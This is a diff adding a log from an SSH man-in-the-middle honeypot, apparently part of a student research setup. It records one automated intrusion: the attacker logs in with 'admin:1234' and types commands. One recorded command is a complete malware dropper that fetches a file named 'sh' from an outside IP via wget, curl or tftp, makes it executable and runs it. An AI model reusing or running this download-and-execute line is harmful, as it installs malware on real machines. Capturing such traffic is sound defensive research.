@@ -1,0 +1,65 @@
+(node:1951214) Warning: Accessing non-existent property 'padLevels' of module exports inside circular dependency
+(Use `node --trace-warnings ...` to show where the warning was created)
+Started with the following options:
+{
+  debug: true,
+  mitmIp: '10.0.3.1',
+  autoAccess: true,
+  autoAccessCache: 5000,
+  maxAttemptsPerConnection: 6,
+  sshServerIdentifier: 'SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2',
+  containerMountPathPrefix: '/var/lib/lxc',
+  containerMountPathSuffix: 'rootfs/',
+  loggingAttackerStreams: '/home/student/MITM/logs/session_streams',
+  loggingAuthenticationAttempts: '/home/student/MITM/logs/authentication_attempts',
+  loggingLogins: '/home/student/MITM/logs/logins',
+  loggingLogouts: '/home/student/MITM/logs/logouts',
+  loggingKeystrokes: '/home/student/MITM/logs/keystrokes',
+  containerName: 'banner-nosession-43935',
+  containerIp: '10.0.3.148',
+  mitmPort: 43935,
+  autoAccessFixed: 1
+}
+2024-11-12 20:33:13.247 - [Info] MITM Version: 2
+2024-11-12 20:33:13.257 - [Info] Auto Access Enabled: true
+2024-11-12 20:33:13.257 - [Debug] [Init] Auto Access Theshold Achieved: false
+2024-11-12 20:33:13.285 - [Info] SSH man-in-the-middle server for 10.0.3.148 listening on 10.0.3.1:43935
+2024-11-12 20:38:03.414 - [Debug] [Connection] Attacker connected: 141.98.11.167 | Client Identification: SSH-2.0-libssh2_1.10.0
+2024-11-12 20:38:04.139 - [Debug] [Auth] Attacker 141.98.11.167 trying to authenticate with 'password'
+2024-11-12 20:38:04.140 - [Debug] [Auto Access] Attacker: 141.98.11.167, Threshold: 1, Attempts: 1
+2024-11-12 20:38:04.141 - [Debug] [Auto Access] Compromising the honeypot
+2024-11-12 20:38:04.141 - [Debug] [Auto Access] Adding the following credentials: 'admin:1234'
+2024-11-12 20:38:04.593 - [Debug] [Auto Access] Auto-access is now disabled for the remainder of this MITM server instance
+2024-11-12 20:38:04.596 - [Debug] [Auth] Valid credentials - Password Authentication
+2024-11-12 20:38:04.598 - [Debug] [LXC] Attempting to connect to the honeypot: 10.0.3.148
+2024-11-12 20:38:04.677 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2024-11-12 20:38:05.133 - [Debug] [SHELL] Opened shell for attacker
+2024-11-12 20:38:05.136 - [Debug] [LXC Streams] New Stream | Total Streams: 1
+2024-11-12 20:38:05.307 - [Debug] [SHELL] Attacker Keystroke: enable[LF]
+2024-11-12 20:38:05.312 - [Debug] [SHELL] line from reader: enable
+2024-11-12 20:38:05.312 - [Debug] [SHELL] Keystroke buffer: 101,110,97,98,108,101,10
+2024-11-12 20:38:05.427 - [Debug] [SHELL] Attacker Keystroke: system[LF]
+2024-11-12 20:38:05.429 - [Debug] [SHELL] line from reader: system
+2024-11-12 20:38:05.429 - [Debug] [SHELL] Keystroke buffer: 115,121,115,116,101,109,10
+2024-11-12 20:38:05.429 - [Debug] [SHELL] Attacker Keystroke: shell[LF]
+2024-11-12 20:38:05.430 - [Debug] [SHELL] line from reader: shell
+2024-11-12 20:38:05.430 - [Debug] [SHELL] Keystroke buffer: 115,104,101,108,108,10
+2024-11-12 20:38:05.431 - [Debug] [SHELL] Attacker Keystroke: sh[LF]
+2024-11-12 20:38:05.431 - [Debug] [SHELL] line from reader: sh
+2024-11-12 20:38:05.431 - [Debug] [SHELL] Keystroke buffer: 115,104,10
+2024-11-12 20:38:05.432 - [Debug] [SHELL] Attacker Keystroke: linuxshell[LF]
+2024-11-12 20:38:05.433 - [Debug] [SHELL] line from reader: linuxshell
+2024-11-12 20:38:05.433 - [Debug] [SHELL] Keystroke buffer: 108,105,110,117,120,115,104,101,108,108,10
+2024-11-12 20:38:05.433 - [Debug] [SHELL] Attacker Keystroke: cd[Space]/tmp/;[Space]echo[Space]"senpai"[Space]>[Space]rootsenpai;[Space]cat[Space]rootsenpai;[Space]rm[Space]-rf[Space]rootsenpai[LF]
+2024-11-12 20:38:05.439 - [Debug] [SHELL] line from reader: cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
+2024-11-12 20:38:05.448 - [Debug] [SHELL] Keystroke buffer: 99,100,32,47,116,109,112,47,59,32,101,99,104,111,32,34,115,101,110,112,97,105,34,32,62,32,114,111,111,116,115,101,110,112,97,105,59,32,99,97,116,32,114,111,111,116,115,101,110,112,97,105,59,32,114,109,32,45,114,102,32,114,111,111,116,115,101,110,112,97,105,10
+2024-11-12 20:38:05.618 - [Debug] [SHELL] Attacker Keystroke: rm[Space]-rf[Space]sh;[Space]wget[Space]http://93.123.109.170/sh[Space]||[Space]curl[Space]-O[Space]http://93.123.109.170/sh[Space]||[Space]tftp[Space]93.123.109.170[Space]-c[Space]get[Space]sh[Space]||[Space]tftp[Space]-g[Space]-r[Space]sh[Space]93.123.109.170;[Space]chmod[Space]777[Space]sh;./sh[Space]ssh;[Space]rm[Space]-rf[Space]sh[LF]
+2024-11-12 20:38:05.628 - [Debug] [SHELL] line from reader: rm -rf sh; wget http://93.123.109.170/sh || curl -O http://93.123.109.170/sh || tftp 93.123.109.170 -c get sh || tftp -g -r sh 93.123.109.170; chmod 777 sh;./sh ssh; rm -rf sh
+2024-11-12 20:38:05.629 - [Debug] [SHELL] Keystroke buffer: 114,109,32,45,114,102,32,115,104,59,32,119,103,101,116,32,104,116,116,112,58,47,47,57,51,46,49,50,51,46,49,48,57,46,49,55,48,47,115,104,32,124,124,32,99,117,114,108,32,45,79,32,104,116,116,112,58,47,47,57,51,46,49,50,51,46,49,48,57,46,49,55,48,47,115,104,32,124,124,32,116,102,116,112,32,57,51,46,49,50,51,46,49,48,57,46,49,55,48,32,45,99,32,103,101,116,32,115,104,32,124,124,32,116,102,116,112,32,45,103,32,45,114,32,115,104,32,57,51,46,49,50,51,46,49,48,57,46,49,55,48,59,32,99,104,109,111,100,32,55,55,55,32,115,104,59,46,47,115,104,32,115,115,104,59,32,114,109,32,45,114,102,32,115,104,10
+2024-11-12 20:38:36.825 - [Debug] [SHELL] Attacker ended the shell
+2024-11-12 20:38:36.939 - [Debug] [Connection] Attacker closed connection
+2024-11-12 20:38:36.947 - [Debug] [LXC] Container's OpenSSH server ended connection
+2024-11-12 20:38:36.948 - [Debug] [LXC] Container's OpenSSH server closed connection
+2024-11-12 20:38:36.949 - [Debug] [LXC Streams] Removed Stream | Total streams: 0
+2024-11-12 20:38:36.949 - [Debug] [SHELL] Honeypot ended shell
+{"level":"error","message":"Forever detected script was killed by signal: SIGKILL"}
